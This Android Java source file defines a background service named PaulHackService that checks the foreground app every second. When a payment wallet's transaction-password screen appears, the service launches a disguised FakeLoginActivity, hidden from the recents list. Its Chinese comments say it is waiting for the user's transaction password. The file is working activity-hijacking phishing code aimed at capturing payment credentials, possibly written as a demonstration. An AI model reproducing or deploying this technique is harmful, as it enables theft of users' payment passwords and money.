package com.iboxpay.hackandroid;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.util.HashMap;
import java.util.List;

public class PaulHackService extends Service {
    private static final String TAG = "Hack";
    Handler handler = new Handler();

    Runnable mTask = new Runnable() {
        @Override
        public void run() {
            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            // 枚举进程
            Log.w(TAG, "===============正在等待用户输入交易密码等关键信息");
            String className = activityManager.getRunningTasks(1).get(0).topActivity.getClassName();
            Log.w(TAG,"当前的activity name是"+className);
            //这里根据你想伪装的页面跳转到自己单独的Activity
            if(className!=null && className.equals("com.iboxpay.wallet.ui.activitys.PayPasswordSetActivity")){
                Log.w(TAG,"进入白条输入交易密码页面，跳转到伪装的页面");
                Intent intent = new Intent(getBaseContext(),FakeLoginActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                startActivity(intent);
            }/*else if (className.equals("com.")){

            }*/

            handler.postDelayed(mTask, 1000);
        }

    };


    public PaulHackService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler.postDelayed(mTask, 1000);
    }


}
